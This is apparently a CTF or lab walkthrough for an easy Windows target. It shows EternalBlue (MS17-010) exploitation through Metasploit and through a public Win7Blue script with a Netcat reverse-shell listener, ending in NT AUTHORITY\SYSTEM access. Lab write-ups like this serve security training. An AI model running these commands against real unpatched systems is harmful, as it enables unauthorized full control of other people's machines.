**OS:** Windows

**Difficulty:** Easy / Low

**IP:** `192.168.1.X`

**Release Date:** 2024-02-03

**Target:** User Flag & Root Flag (`NT AUTHORITY\SYSTEM`)

---

## Phase 1: Reconnaissance & Enumeration

### 1.1 Port Scanning (Nmap)

```bash
nmap -sn 192.168.1.0/24
```

We discovered that the host `192.168.1.179` is active and has port 445 (SMB) open.

### 1.2 Vulnerability Verification (Nmap)

We checked if the target is vulnerable to EternalBlue (MS17-010) using an Nmap NSE script:

```bash
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.1.179
```

---

## Phase 2: Exploitation

### Option A: Automated Exploitation (Metasploit)

We launch `msfconsole` and select the EternalBlue exploit module:

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Configure the required options (`RHOSTS` for the target IP and verify `LHOST` matches our attacker machine IP):

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.179
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.X
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

The exploit runs successfully, granting us an active Meterpreter session with full system privileges:

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Option B: Manual Exploitation

We can check for the MS17-010 vulnerability using Nmap:

```bash
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.1.179
```

From the scan results, we extract the CVE identifier: **CVE-2017-0143**. Searching for public GitHub exploits leads us to the **Win7Blue** repository by `d4t4s3c`.

#### 1. Repository Setup & Permissions

Clone the repository to our Kali Linux environment and make the script executable:

```bash
git clone https://github.com/d4t4s3c/Win7Blue.git
cd Win7Blue
sudo chmod +x Win7Blue
```

#### 2. Exploit Configuration & Execution

Run the script and select Option 4 (matching our target OS architecture/type):

```bash
./Win7Blue
```

Fill in the required parameters:

- **RHOST:** `192.168.1.179`
- **LHOST:** `192.168.1.X` (Our Kali IP)
- **LPORT:** `4444` (or your chosen listening port)

#### 3. Setting Up Listener & Gaining Access

In a separate terminal, start a Netcat listener on our chosen LPORT:

```bash
nc -nlvp 4444
```

Execute the exploit from the script. Once triggered, a reverse shell connection is received as `NT AUTHORITY\SYSTEM`.

